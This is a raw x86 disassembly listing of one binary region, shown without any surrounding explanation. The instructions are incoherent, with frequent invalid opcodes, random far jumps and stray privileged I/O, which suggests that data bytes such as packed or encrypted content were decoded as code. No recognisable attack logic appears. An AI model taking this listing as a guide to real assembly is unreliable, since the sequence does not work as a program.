  41ab75:	xchg   DWORD PTR [eax],ebp
  41ab77:	sbb    ah,BYTE PTR [edi-0x6d]
  41ab7a:	idiv   DWORD PTR [edi]
  41ab7c:	dec    edx
  41ab7d:	sqrtps xmm4,XMMWORD PTR [ecx]
  41ab80:	daa    
  41ab81:	lahf   
  41ab82:	or     DWORD PTR [edi-0x4bdf23d9],ebp
  41ab88:	mov    eax,ds:0x1ce7e9d4
  41ab8d:	inc    edx
  41ab8e:	jbe    0x41ab7f
  41ab90:	and    BYTE PTR [ecx],bh
  41ab92:	mov    bh,BYTE PTR [eax-0x39c63e30]
  41ab98:	add    edi,0xc00bb423
  41ab9e:	mov    dl,BYTE PTR [edi-0x35]
  41aba1:	jo     0x41ab59
  41aba3:	shl    al,0x65
  41aba6:	aaa    
  41aba7:	xlat   BYTE PTR ds:[ebx]
  41aba8:	ins    BYTE PTR es:[edi],dx
  41aba9:	aad    0xce
  41abab:	sub    al,0x8b
  41abad:	ja     0x41abbe
  41abaf:	jg     0x41ab4f
  41abb1:	aas    
  41abb2:	add    BYTE PTR [ebx-0x52],bh
  41abb5:	and    esi,DWORD PTR [ebx-0x18]
  41abb8:	arpl   WORD PTR [ebp+0x14def802],bx
  41abbe:	push   ecx
  41abbf:	fwait
  41abc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abc1:	xor    al,0xd4
  41abc3:	je     0x41ab7a
  41abc5:	push   esi
  41abc6:	(bad)  
  41abc7:	popf   
  41abc8:	or     ch,BYTE PTR [ebx*8-0xd592bc6]
  41abcf:	(bad)  
  41abd0:	(bad)  
  41abd1:	int3   
  41abd2:	popa   
  41abd3:	scas   al,BYTE PTR es:[edi]
  41abd4:	sub    esi,DWORD PTR [ecx-0x2e]
  41abd7:	test   eax,0x19a5e0d3
  41abdc:	cmp    al,BYTE PTR [esi]
  41abde:	xchg   ebp,eax
  41abdf:	dec    ebx
  41abe0:	push   0x19
  41abe2:	adc    eax,0xde22d1e9
  41abe7:	and    dl,BYTE PTR [ebx-0x33]
  41abea:	ins    BYTE PTR es:[edi],dx
  41abeb:	mov    ds:0xbfa4562d,al
  41abf0:	out    0x50,eax
  41abf2:	jae    0x41ab91
  41abf4:	icebp  
  41abf5:	mov    esp,0xd79dd74a
  41abfa:	mov    eax,ds:0x40ccc0f3
  41abff:	xlat   BYTE PTR ds:[ebx]
  41ac00:	adc    DWORD PTR [ecx+0x79],edx
  41ac03:	push   eax
  41ac04:	stc    
  41ac05:	and    ecx,DWORD PTR [edx+0x53bd0e3a]
  41ac0b:	xchg   ebx,eax
  41ac0c:	mov    BYTE PTR [edi+0x1a],ah
  41ac0f:	lea    esp,[ecx]
  41ac11:	imul   BYTE PTR ds:[ecx]
  41ac14:	js     0x41aba1
  41ac16:	mov    ?,eax
  41ac18:	push   esp
  41ac19:	xchg   edx,eax
  41ac1a:	sub    al,0x35
  41ac1c:	fadd   QWORD PTR [esi+0x31]
  41ac1f:	push   eax
  41ac20:	pop    eax
  41ac21:	xchg   esi,edx
  41ac23:	sbb    eax,0x53866903
  41ac28:	cld    
  41ac29:	js     0x41ac12
  41ac2b:	mov    BYTE PTR [ebx],cl
  41ac2d:	jmp    0xfdc6:0x8727f41d
  41ac34:	lds    ebp,FWORD PTR [edx]
  41ac36:	stos   DWORD PTR es:[edi],eax
  41ac37:	sbb    al,al
  41ac39:	cli    
  41ac3a:	inc    esp
  41ac3b:	dec    eax
  41ac3c:	inc    eax
  41ac3d:	xlat   BYTE PTR ds:[ebx]
  41ac3e:	pop    ds
  41ac3f:	call   0x8442c964
  41ac44:	stos   DWORD PTR es:[edi],eax
  41ac45:	sub    eax,0xa7a093b2
  41ac4a:	mov    bl,0xe4
  41ac4c:	push   edx
  41ac4d:	push   cs
  41ac4e:	loope  0x41ac78
  41ac50:	retf   0xa7f
  41ac53:	mov    esi,0xfd1eb1fb
  41ac58:	push   esp
  41ac59:	xlat   BYTE PTR ds:[ebx]
  41ac5a:	sub    ch,BYTE PTR [ebp-0x4fea64b]
  41ac60:	mov    ds:0x636488de,al
  41ac65:	and    al,0x9b
  41ac67:	sbb    esp,DWORD PTR [edi]
  41ac69:	je     0x41ac17
  41ac6b:	lds    esp,FWORD PTR [edi+0x5f]
  41ac6e:	mov    DWORD PTR [ebx+eiz*2+0x67],esi
  41ac72:	rcr    DWORD PTR [ebp-0x68],cl
  41ac75:	fdiv   DWORD PTR [edi+0x15]
  41ac78:	mov    esp,0xc9c047ce
  41ac7d:	scas   eax,DWORD PTR es:[edi]
  41ac7e:	sub    cl,bl
  41ac80:	mov    eax,0xcd3cf76a
  41ac86:	inc    ebp
  41ac87:	add    bl,BYTE PTR [ebx+0x25]
  41ac8a:	nop
  41ac8b:	repnz mov bh,0xd7
  41ac8e:	jmp    0x3ec3:0xcaa73a8a
  41ac95:	popf   
  41ac96:	and    al,0xf8
  41ac98:	xor    eax,0xaff94efa
  41ac9d:	mov    eax,0xbc96720a
  41aca2:	cmp    dh,BYTE PTR [edi-0x77]
  41aca5:	push   edx
  41aca6:	icebp  
  41aca7:	imul   edi,DWORD PTR [esi-0x4654ccd3],0xe2725ee8
  41acb1:	repz add ch,ah
  41acb4:	fld    DWORD PTR [eax-0x5e347a1c]
  41acba:	out    0x6e,al
  41acbc:	ins    DWORD PTR es:[edi],dx
  41acbd:	test   DWORD PTR [eax],ebp
  41acbf:	sub    eax,edi
  41acc1:	fnstcw WORD PTR [edi+edx*2]
  41acc4:	jo     0x41ad09
  41acc6:	mov    eax,ds:0x3131af7d
  41accb:	leave  
  41accc:	push   ecx
  41accd:	jmp    0x9e73:0x37b90803
  41acd4:	mov    ds:0x3450df0d,al
  41acd9:	mov    ebx,0xe6c0331b
  41acde:	stos   BYTE PTR es:[edi],al
  41acdf:	dec    eax
  41ace0:	push   esp
  41ace1:	sahf   
  41ace2:	psrad  mm4,0x30
  41ace6:	jbe    0x41ac9d
  41ace8:	jmp    0x41ac8f
  41acea:	lahf   
  41aceb:	adc    edi,ebp
  41aced:	dec    edi
  41acee:	xchg   ebx,eax
  41acef:	fwait
  41acf0:	addr16 xchg ebp,eax
  41acf2:	mov    ebx,0x17390702
  41acf7:	sub    eax,0x8bc87414
  41acfc:	sbb    eax,0x36e2561c
  41ad01:	shl    BYTE PTR [edi],cl
  41ad03:	xchg   edx,eax
  41ad04:	lods   al,BYTE PTR ds:[esi]
  41ad05:	mov    ah,0x91
  41ad07:	fwait
  41ad08:	mov    BYTE PTR [ecx],al
  41ad0a:	lahf   
  41ad0b:	cmp    dh,BYTE PTR [edi-0x2]
  41ad0e:	fcmovne st,st(6)
  41ad10:	bound  ebp,QWORD PTR [edi-0x73]
  41ad13:	xor    eax,0x1b4a8f66
  41ad18:	cmp    al,bh
  41ad1a:	jmp    0x2b63:0x386bac5b
  41ad21:	xchg   esp,eax
  41ad22:	out    0xf7,al
  41ad24:	loop   0x41ada4
  41ad26:	push   cs
  41ad27:	rol    BYTE PTR [ebx+0x7e501be0],1
  41ad2d:	ins    DWORD PTR es:[edi],dx
  41ad2e:	xor    DWORD PTR [edi+ebp*4+0x6e],esp
  41ad32:	stos   BYTE PTR es:[edi],al
  41ad33:	je     0x41acf3
  41ad35:	(bad)  [eax]
  41ad37:	sub    BYTE PTR [edi-0x78ff544b],ch
  41ad3d:	xchg   ecx,eax
  41ad3e:	into   
  41ad3f:	dec    ebp
  41ad40:	mov    dh,0x77
  41ad42:	mov    DWORD PTR [ebp+0x3d],ebx
  41ad45:	add    DWORD PTR [ebp-0x6b7941ff],ebx
  41ad4b:	adc    al,0x1d
  41ad4d:	fisub  DWORD PTR [edi+edx*4-0x6a]
  41ad51:	je     0x41ad0c
  41ad53:	mov    ebp,0x61e29f32
  41ad58:	not    BYTE PTR [ebx+0x4ab09e98]
  41ad5e:	push   esi
  41ad5f:	sub    al,0xa2
  41ad61:	call   0xe7cd:0x40672370
  41ad68:	enter  0xcd1,0x49
  41ad6c:	(bad)  
  41ad6d:	scas   al,BYTE PTR es:[edi]
  41ad6e:	imul   esp,DWORD PTR [eax-0x1957ddcb],0xffffffbb
  41ad75:	mov    bl,BYTE PTR [edi-0x7c32566c]
  41ad7b:	push   es
  41ad7c:	jecxz  0x41adb6
  41ad7e:	jne    0x41adb9
  41ad80:	aaa    
  41ad81:	jg     0x41adac
  41ad83:	sbb    esi,edi
  41ad85:	mov    dl,0x31
  41ad87:	(bad)  
  41ad88:	in     eax,dx
  41ad89:	xor    BYTE PTR [esi-0x3ebec604],dh
  41ad8f:	mov    esp,0x5370da44
  41ad94:	sbb    esi,DWORD PTR [eax]
  41ad96:	sbb    al,0x53
  41ad98:	dec    esi
  41ad99:	pop    ebp
  41ad9a:	add    ah,0x9f
  41ad9d:	les    ebp,FWORD PTR [edi]
  41ad9f:	popf   
  41ada0:	lock sbb ah,0xbf
  41ada4:	dec    esp
  41ada5:	call   0xa400:0x764539d7
  41adac:	dec    esi
  41adad:	aam    0x7b
  41adaf:	xor    dh,BYTE PTR [ebx]
  41adb1:	dec    ebp
  41adb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb3:	daa    
  41adb4:	out    dx,eax
  41adb5:	pop    ebp
  41adb6:	xor    DWORD PTR [ebx],0xe48ba395
  41adbc:	pushf  
  41adbd:	mov    dh,0x34
  41adbf:	hlt    
  41adc0:	pop    ss
  41adc1:	aas    
  41adc2:	stos   BYTE PTR es:[edi],al
  41adc3:	repnz mov al,0xf3
  41adc6:	sub    BYTE PTR [ecx],bh
  41adc8:	imul   esi,DWORD PTR [ecx],0x9ccdb1bf
  41adce:	add    esi,ecx
  41add0:	adc    BYTE PTR [eax],dh
  41add2:	loop   0x41ad5c
  41add4:	test   al,0x15
  41add6:	xchg   ecx,eax
  41add7:	jae    0x41ad77
  41add9:	mov    bh,0x28
  41addb:	adc    BYTE PTR [esi+0x1b0c5d6e],dh
  41ade1:	dec    ebx
  41ade2:	push   edx
  41ade3:	dec    ecx
  41ade4:	mov    dl,0x46
  41ade6:	out    dx,al
  41ade7:	xchg   esp,eax
  41ade8:	aas    
  41ade9:	pop    edx
  41adea:	ins    BYTE PTR es:[edi],dx
  41adeb:	cmp    ecx,DWORD PTR [esi+0x1db19696]
  41adf1:	xor    BYTE PTR [ebx],al
  41adf3:	push   0x6f
  41adf5:	push   es
  41adf6:	adc    DWORD PTR [eax+0x22],esp
  41adf9:	lods   al,BYTE PTR ds:[esi]
  41adfa:	aam    0x1c
  41adfc:	jns    0x41ae73
  41adfe:	lahf   
  41adff:	pop    edx
  41ae00:	mov    dl,0xa1
  41ae02:	ss aaa 
  41ae04:	int3   
  41ae05:	push   edx
  41ae06:	cmp    BYTE PTR [ebx],dh
  41ae08:	jbe    0x41ad8e
  41ae0a:	outs   dx,BYTE PTR ds:[si]
  41ae0c:	ficom  WORD PTR [ebx-0x20]
  41ae0f:	fcomi  st,st(4)
  41ae11:	jmp    0x41ade7
  41ae13:	jle    0x41ae4d
  41ae15:	add    DWORD PTR [ebp-0x46b3da9c],esi
  41ae1b:	les    esi,FWORD PTR [edx]
  41ae1d:	loopne 0x41add1
  41ae1f:	push   ebp
  41ae20:	int    0xd0
  41ae22:	retf   0x92de
  41ae25:	push   ecx
  41ae26:	cmp    BYTE PTR [ebx-0x4f5cf3be],0x7a
  41ae2d:	repnz cld 
  41ae2f:	ja     0x41ae8a
  41ae31:	xchg   BYTE PTR [edx-0x74],al
  41ae34:	pop    esp
  41ae35:	retf   0x69ad
  41ae38:	sbb    bl,0x37
  41ae3b:	xchg   DWORD PTR [edi+edi*8-0x758b4277],edx
  41ae42:	sub    bl,BYTE PTR [eax+0x194a8945]
  41ae48:	xchg   ebp,eax
  41ae49:	pushf  
  41ae4a:	in     eax,0x4b
  41ae4c:	sbb    al,0xe5
  41ae4e:	mov    BYTE PTR cs:[ebx-0x139002c3],cl
  41ae55:	or     ecx,DWORD PTR [ebp-0x79e45873]
  41ae5b:	iret   
  41ae5c:	fstp   DWORD PTR [eax-0x7040b745]
  41ae62:	push   es
  41ae63:	ret    
  41ae64:	mov    ah,cl
  41ae66:	popa   
  41ae67:	dec    esi
  41ae68:	xchg   esp,eax
  41ae69:	daa    
  41ae6a:	out    0x20,eax
  41ae6c:	je     0x41ae2c
  41ae6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae6f:	adc    eax,0x2d62cef4
  41ae74:	sbb    esi,ebx
  41ae76:	and    DWORD PTR [ecx],0xffffffd6
  41ae79:	sub    BYTE PTR [edx+ecx*4-0x5a7f2735],ah
  41ae80:	in     al,dx
  41ae81:	xchg   DWORD PTR [esi],esp
  41ae83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae84:	mov    ch,BYTE PTR [edx+0x76]
  41ae87:	ins    BYTE PTR es:[edi],dx
  41ae88:	xchg   ecx,eax
  41ae89:	pop    esi
  41ae8a:	repnz mov eax,0xb01719f9
  41ae90:	sbb    edi,DWORD PTR [ecx+esi*4+0x47]
  41ae94:	hlt    
  41ae95:	lahf   
  41ae96:	pop    ebp
  41ae97:	fwait
  41ae98:	and    dl,BYTE PTR [ebx+0x8a24437]
  41ae9e:	push   es
  41ae9f:	dec    ecx
  41aea0:	gs push ebp
  41aea2:	fstp   DWORD PTR [ebp-0x14]
  41aea5:	mov    dh,0x5f
  41aea7:	jbe    0x41ae4a
  41aea9:	fs pop ecx
  41aeab:	fisttp QWORD PTR [esi-0x796dd493]
  41aeb1:	and    eax,0x9b07333
  41aeb6:	fmul   DWORD PTR [edi]
  41aeb8:	dec    edi
  41aeb9:	dec    ebp
  41aeba:	sub    eax,0xb37d9e84
  41aebf:	jge    0x41aeed
  41aec1:	test   eax,0x2a1d2ffd
  41aec6:	repnz imul edx,DWORD PTR [edi+0x692a2e3],0xc5002fc6
  41aed1:	idiv   BYTE PTR [ebp+0x1]
  41aed4:	popf   
  41aed5:	push   ebp
  41aed6:	pop    edi
  41aed7:	sar    DWORD PTR [edx],0xed
  41aeda:	xor    ecx,DWORD PTR [esi+esi*2-0x63]
  41aede:	adc    BYTE PTR [ebx],bl
  41aee0:	cmc    
  41aee1:	mov    WORD PTR [ecx],ds
  41aee3:	outs   dx,BYTE PTR ds:[esi]
  41aee4:	pop    esp
  41aee5:	adc    al,0x38
  41aee7:	lods   al,BYTE PTR ds:[esi]
  41aee8:	lea    ecx,[eax+eiz*1+0x2f736a14]
  41aeef:	adc    DWORD PTR [edx+esi*8+0x5d],esi
  41aef3:	cdq    
  41aef4:	popf   
  41aef5:	nop
  41aef6:	or     edi,ebp
  41aef8:	mov    ch,0x78
  41aefa:	inc    esp
  41aefb:	arpl   WORD PTR [bp+di],dx
  41aefe:	push   cs
  41aeff:	fs jecxz 0x41aeb1
  41af02:	mov    ds:0xb0b25a55,eax
  41af07:	dec    esi
  41af08:	hlt    
  41af09:	jb     0x41af3f
  41af0b:	adc    al,0x74
  41af0d:	jb     0x41aedf
  41af0f:	push   esi
  41af10:	es into 
  41af12:	pushf  
  41af13:	dec    edx
  41af14:	(bad)  
  41af16:	(bad)  
  41af17:	xchg   ecx,eax
  41af18:	imul   edi,DWORD PTR [esi*8-0x2357196d],0x3447dad9
  41af23:	xlat   BYTE PTR ds:[ebx]
  41af24:	ficomp WORD PTR [edx+0x708236a6]
  41af2a:	xor    ch,BYTE PTR [ebx+0x21eea77d]
  41af30:	mov    esp,0x41afcc13
  41af35:	rol    DWORD PTR [edi-0x59],cl
  41af38:	pop    eax
  41af39:	inc    ebx
  41af3a:	in     al,dx
  41af3b:	rcl    DWORD PTR [ebx],cl
  41af3d:	fsub   st(6),st
  41af3f:	mov    bl,0xfe
  41af41:	inc    ecx
  41af42:	out    0xc,al
  41af44:	or     edx,ecx
  41af46:	push   0x23
  41af48:	mov    edx,0xd9552941
  41af4d:	sub    eax,DWORD PTR [edx+0x7a]
  41af50:	test   DWORD PTR [edi+0x692d574f],edx
  41af56:	ja     0x41af48
  41af58:	nop
  41af59:	stos   BYTE PTR es:[edi],al
  41af5a:	inc    edx
  41af5b:	leave  
  41af5c:	mov    ah,0xca
  41af5e:	stos   DWORD PTR es:[edi],eax
  41af5f:	xor    esp,DWORD PTR [ebx+0x73f71a1b]
  41af65:	ins    BYTE PTR es:[edi],dx
  41af66:	loope  0x41aee8
  41af68:	jecxz  0x41aeeb
  41af6a:	dec    ebx
  41af6b:	fs loope 0x41afe2
  41af6e:	repz rcr BYTE PTR [ecx],1
  41af71:	(bad)  [ebx]
  41af73:	xchg   edi,eax
  41af74:	or     eax,0x83e7d655
  41af79:	pop    ecx
  41af7a:	sub    al,0x14
  41af7c:	aas    
  41af7d:	jbe    0x41af3c
  41af7f:	mov    esp,0xa6f446ae
  41af84:	sbb    edx,ecx
  41af86:	inc    eax
  41af87:	data16 fist WORD PTR [ecx-0x2f]
  41af8b:	call   0xb037:0x367ed902
  41af92:	mov    ebx,0x7df5a726
  41af97:	xchg   esp,eax
  41af98:	pop    ss
  41af99:	push   es
  41af9a:	mov    dl,0x33
  41af9c:	cmp    BYTE PTR [edx],bl
  41af9e:	es fwait
  41afa0:	add    BYTE PTR [esi],dl
  41afa2:	jl     0x41af3c
  41afa4:	adc    DWORD PTR [ebp-0x388edbbb],eax
  41afaa:	mov    dh,0x77
  41afac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afad:	xor    al,0x5e
  41afaf:	out    dx,eax
  41afb0:	add    eax,0x86951e15
  41afb5:	pop    es
  41afb6:	and    eax,0x868fc463
  41afbb:	mov    al,0xcf
  41afbd:	jmp    0x41afba
  41afbf:	jecxz  0x41af78
  41afc1:	in     al,dx
  41afc2:	adc    ecx,DWORD PTR [edi]
  41afc4:	or     DWORD PTR [ecx],esp
  41afc6:	mov    ecx,0xe89a396
  41afcb:	in     al,0x7f
  41afcd:	(bad)
  41afd0:	mov    ch,0xf9
  41afd2:	ja     0x41af65
  41afd4:	add    DWORD PTR [edx],ebp
  41afd6:	and    edx,DWORD PTR [ecx+edi*8-0x59c4046e]
  41afdd:	aad    0xea
  41afdf:	pop    es
  41afe0:	mov    ds:0x2c998e9a,eax
  41afe5:	sbb    DWORD PTR [ecx+0x23f5957f],ecx
  41afeb:	push   esp
  41afec:	cdq    
  41afed:	sbb    eax,0x5be6c1bb
  41aff2:	js     0x41b016
  41aff4:	cmp    eax,0xb47c7bd5
  41aff9:	repnz int3 
  41affb:	ins    BYTE PTR es:[edi],dx
  41affc:	add    DWORD PTR [edx+0x57],esp
  41afff:	aam    0x69
  41b001:	or     WORD PTR [esi],di
  41b004:	and    al,0xf8
  41b006:	repnz pushf 
  41b008:	or     ch,cl
  41b00a:	xchg   edi,eax
  41b00b:	(bad)  
  41b00d:	cmp    DWORD PTR [ebx],esp
  41b00f:	fsubr  DWORD PTR cs:[eax+ecx*4-0x6d]
  41b014:	(bad)  
  41b015:	jl     0x41afe3
  41b017:	push   edi
  41b018:	jbe    0x41af9f
  41b01a:	lods   al,BYTE PTR ds:[esi]
  41b01b:	mov    BYTE PTR [ebx+0x3a],bl
  41b01e:	fmul   st,st(7)
  41b020:	imul   ecx,DWORD PTR [edx-0x77188ee2],0xf
  41b027:	sbb    ch,BYTE PTR [esi-0x52b70d76]
  41b02d:	add    dh,BYTE PTR [esi]
  41b02f:	ja     0x41afe2
  41b031:	add    esi,eax
  41b033:	mov    eax,0x3e15d5ff
  41b038:	jge    0x41afc4
  41b03a:	xor    bl,BYTE PTR [ebx]
  41b03c:	xchg   ebp,eax
  41b03d:	cmc    
  41b03e:	mov    esi,DWORD PTR ss:[ecx+0x27479b2b]
  41b045:	fimul  WORD PTR [ebx+ebp*4]
  41b048:	stos   DWORD PTR es:[edi],eax
  41b049:	sub    eax,0x8f88675f
  41b04e:	push   esp
  41b04f:	adc    BYTE PTR [edi],0x8e
  41b052:	pusha  
  41b053:	sar    DWORD PTR [edi+0x764738f7],cl
  41b059:	inc    edx
  41b05a:	dec    edi
  41b05b:	dec    esp
  41b05c:	jb     0x41aff0
  41b05e:	pop    edi
  41b05f:	cmc    
  41b060:	rcr    BYTE PTR ds:0x30236904,cl
  41b066:	mov    al,0xcb
  41b068:	sub    eax,0x4400a70a
  41b06d:	jae    0x41b04f
  41b06f:	adc    al,al
  41b071:	fisttp WORD PTR [ebp+0x16]
  41b074:	ret    0xb846
  41b077:	jb     0x41b02e
  41b079:	fiadd  DWORD PTR [ebp+0x4b]
  41b07c:	inc    esi
  41b07d:	test   ebx,0x8aa031df
  41b083:	jle    0x41b077
  41b085:	lds    eax,FWORD PTR [esi+0x58855fb4]
  41b08b:	jecxz  0x41b077
  41b08d:	ror    DWORD PTR [ecx+0x7d],1
  41b090:	fs jle 0x41b01c
  41b093:	das    
  41b094:	push   eax
  41b095:	mov    bh,0xb1
  41b097:	sub    ch,BYTE PTR es:[ecx]
  41b09a:	mov    esp,0xd95d2819
  41b09f:	xor    al,0x10
  41b0a1:	and    ecx,DWORD PTR [ebp+0x2]
  41b0a4:	ins    DWORD PTR es:[edi],dx
  41b0a5:	aam    0x9e
  41b0a7:	pop    es
  41b0a8:	jmp    0xd1331dd2
  41b0ad:	ins    DWORD PTR es:[edi],dx
  41b0ae:	inc    esp
  41b0af:	lds    edx,FWORD PTR [ebx-0x5b]
  41b0b2:	fist   DWORD PTR [esi-0x778df582]
  41b0b8:	(bad)  
  41b0b9:	jp     0xd17c49b4
  41b0bf:	mov    eax,ds:0x40f662ee
  41b0c4:	sbb    esi,ebp
  41b0c6:	fstp   DWORD PTR [ebp-0x75755784]
  41b0cc:	ret    
  41b0cd:	jge    0x41b051
  41b0cf:	sbb    al,dl
  41b0d1:	pop    edi
  41b0d2:	(bad)  
  41b0d3:	pop    ds
  41b0d4:	dec    edx
  41b0d5:	call   0x24d9cd71
  41b0da:	push   ss
  41b0db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0dc:	xchg   DWORD PTR [edx-0x30],edx
  41b0df:	dec    ebx
  41b0e0:	lods   al,BYTE PTR ds:[esi]
  41b0e1:	out    dx,eax
  41b0e2:	mov    edi,0x855a8984
  41b0e7:	pop    es
  41b0e8:	rol    DWORD PTR [edi],1
  41b0ea:	jp     0x41b130
  41b0ec:	inc    esp
  41b0ed:	sbb    ecx,DWORD PTR [ecx-0x11]
  41b0f0:	and    bh,dl
  41b0f2:	cli    
  41b0f3:	fmul   DWORD PTR [ecx+ecx*2-0x7b]
  41b0f7:	or     DWORD PTR [ebp+ebx*4+0x236d0152],edi
  41b0fe:	out    dx,eax
  41b0ff:	adc    eax,DWORD PTR [ebp-0x77a7c19d]
  41b105:	inc    edi
  41b106:	aad    0x0
  41b108:	xor    DWORD PTR [ecx],edx
  41b10a:	arpl   WORD PTR [ebx],si
  41b10c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b10d:	iret   
  41b10e:	test   BYTE PTR [eax-0x68],ah
  41b111:	and    dl,cl
  41b113:	fadd   DWORD PTR [esi+ebx*8-0x67]
  41b117:	(bad)  
  41b119:	mov    ah,0xb
  41b11b:	(bad)  
  41b11c:	mov    ebx,0x7b49a84a
  41b121:	xchg   esp,edx
  41b123:	call   edx
  41b125:	xor    eax,0x96f47287
  41b12a:	sub    bl,bh
  41b12c:	mov    dl,0x32
  41b12e:	jl     0x41b19f
  41b130:	sub    ebx,esi
  41b132:	xor    BYTE PTR [esi+0x49],dl
  41b135:	jno    0x41b1a7
  41b137:	dec    esi
  41b138:	clc    
  41b139:	fs icebp 
  41b13b:	shr    BYTE PTR [ebx+edx*8],0xa2
  41b13f:	outs   dx,DWORD PTR ds:[esi]
  41b140:	fistp  DWORD PTR [ebp-0x73]
  41b143:	iret   
  41b144:	or     dl,BYTE PTR [ebp+0x7337ae26]
  41b14a:	xchg   esp,eax
  41b14b:	xchg   DWORD PTR [ecx],edi
  41b14d:	inc    esi
  41b14e:	mov    WORD PTR [edx],?
  41b150:	pop    edi
  41b151:	cld    
  41b152:	imul   ebx,DWORD PTR [ebx+0x3f],0x51
  41b156:	mov    BYTE PTR [eax],0x9d
  41b159:	sub    al,0x51
  41b15b:	rcr    DWORD PTR [esi-0x37fc45c],1
  41b161:	int    0xf1
  41b163:	sbb    al,0x90
  41b165:	ss popa 
  41b167:	push   ds
  41b168:	jne    0x41b1b6
  41b16a:	sub    BYTE PTR [ebp+0x5c14caaf],dl
  41b170:	stc    
  41b171:	push   esi
  41b172:	add    ebp,0x72
  41b175:	jp     0x41b1e9
  41b177:	in     al,dx
  41b178:	push   ebp
  41b179:	repz ret 0x21e7
  41b17d:	xor    eax,0x9ff60d4
  41b182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b183:	aad    0x49
  41b185:	popf   
  41b186:	(bad)  
  41b187:	jmp    0xbf10:0x4ee96241
  41b18e:	jmp    0x41b163
  41b190:	sti    
  41b191:	iret   
  41b192:	jnp    0x41b190
  41b194:	jmp    0xc7a7:0x2c3019ab
  41b19b:	add    DWORD PTR [edi],eax
  41b19d:	rcl    ebx,1
  41b19f:	sbb    esp,DWORD PTR [edi]
  41b1a1:	jle    0x41b21e
  41b1a3:	int3   
  41b1a4:	pop    ecx
  41b1a5:	inc    edx
  41b1a6:	js     0x41b1c2
  41b1a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1a9:	inc    ebp
  41b1aa:	inc    eax
  41b1ab:	rol    edi,1
  41b1ad:	lds    edi,FWORD PTR [edi]
  41b1af:	(bad)  
  41b1b0:	cmp    BYTE PTR [esi+0x69973ffc],dh
  41b1b6:	mov    ebx,0xc8113f78
  41b1bb:	jnp    0x41b161
  41b1bd:	stos   BYTE PTR es:[edi],al
  41b1be:	pop    eax
  41b1bf:	push   ds
  41b1c0:	sbb    DWORD PTR [edi+0x36],edi
  41b1c3:	les    edx,FWORD PTR [esi-0x76]
  41b1c6:	pop    es
  41b1c7:	sub    bl,dh
  41b1c9:	sub    eax,0xb88f9a10
  41b1ce:	es repnz out dx,al
  41b1d1:	outs   dx,DWORD PTR ds:[esi]
  41b1d2:	arpl   WORD PTR [eax+0x7688551b],sp
  41b1d8:	lea    esp,[esi-0x575db7ce]
  41b1de:	adc    al,0xe2
  41b1e0:	in     eax,0xbc
  41b1e2:	mov    eax,0xafb33356
  41b1e7:	dec    ebp
  41b1e8:	out    0xcd,eax
  41b1ea:	sub    DWORD PTR [ecx],eax
  41b1ec:	ins    DWORD PTR es:[edi],dx
  41b1ed:	jo     0x41b25d
  41b1ef:	pushf  
  41b1f0:	cmp    DWORD PTR [edi-0x39],edx
  41b1f3:	fwait
  41b1f4:	add    BYTE PTR [edx+0x5cc514e3],dh
  41b1fa:	adc    bl,al
  41b1fc:	outs   dx,DWORD PTR ds:[esi]
  41b1fd:	xchg   ebp,eax
  41b1fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1ff:	mov    edi,0x5e336ecb
  41b204:	out    0xf4,eax
  41b206:	in     eax,0x1e
  41b208:	push   ss
  41b209:	fsubp  st(5),st
  41b20b:	lea    ebx,[ebp-0x700bb163]
  41b211:	int    0x2e
  41b213:	pop    ebp
  41b214:	aaa    
  41b215:	mov    dh,ah
  41b217:	bnd jnp 0x41b286
  41b21a:	jae    0x41b224
  41b21c:	dec    edi
  41b21d:	mov    dh,0x50
  41b21f:	fdiv   QWORD PTR [ebx]
  41b221:	rol    BYTE PTR [esi],0x38
  41b224:	scas   al,BYTE PTR es:[edi]
  41b225:	add    BYTE PTR [ebp+edx*2+0x6d],bh
  41b229:	lahf   
  41b22a:	ins    DWORD PTR es:[edi],dx
  41b22b:	cmp    esp,DWORD PTR [ecx]
  41b22d:	cmp    ebx,edi
  41b22f:	retf   
  41b230:	int3   
  41b231:	lds    esp,FWORD PTR [ebx-0x69]
  41b234:	lods   eax,DWORD PTR ds:[esi]
  41b235:	mov    dh,ch
  41b237:	leave  
  41b238:	xlat   BYTE PTR ds:[ebx]
  41b239:	push   edi
  41b23a:	mov    eax,ds:0xda2dc520
  41b23f:	clc    
  41b240:	outs   dx,BYTE PTR ds:[esi]
  41b241:	jno    0x41b1d0
  41b243:	push   ss
  41b244:	sub    al,0x94
  41b246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b247:	add    eax,0x4ab584d7
  41b24c:	cld    
  41b24d:	jmp    0x41b2ba
  41b24f:	jae    0x41b218
  41b251:	sbb    DWORD PTR [ebp+ebp*1-0x152bf78c],ebx
  41b258:	adc    DWORD PTR [ebp+edi*2+0x6e],0xa86305ba
  41b260:	add    al,0x5
  41b262:	pop    esp
  41b263:	push   ebp
  41b264:	mov    esi,0xe165131c
  41b269:	into   
  41b26a:	add    esi,DWORD PTR [edi]
  41b26c:	hlt    
  41b26d:	mov    edx,0xd635332a
  41b272:	icebp  
  41b273:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b274:	fdiv   st(1),st
  41b276:	fsubr  DWORD PTR [ebp+eax*2+0x70276d1e]
  41b27d:	or     eax,0x97142dfe
  41b282:	jo     0x41b2ee
  41b284:	dec    ebx
  41b285:	popf   
  41b286:	cwde   
  41b287:	xor    al,0xa2
  41b289:	scas   al,BYTE PTR es:[edi]
  41b28a:	jb     0x41b30a
  41b28c:	imul   esp,edi,0xd
  41b28f:	shr    BYTE PTR ds:0x1acacc98,0x8d
  41b296:	adc    dh,BYTE PTR ds:0x45249dd0
  41b29c:	jb     0x41b2e0
  41b29e:	xchg   edx,eax
  41b29f:	push   ebx
  41b2a0:	pop    es
  41b2a1:	cli    
  41b2a2:	sub    ah,BYTE PTR [ecx-0x2c96b451]
  41b2a8:	inc    ebx
  41b2a9:	mov    edx,0x6600c041
  41b2ae:	call   0x1058:0x38c6e99b
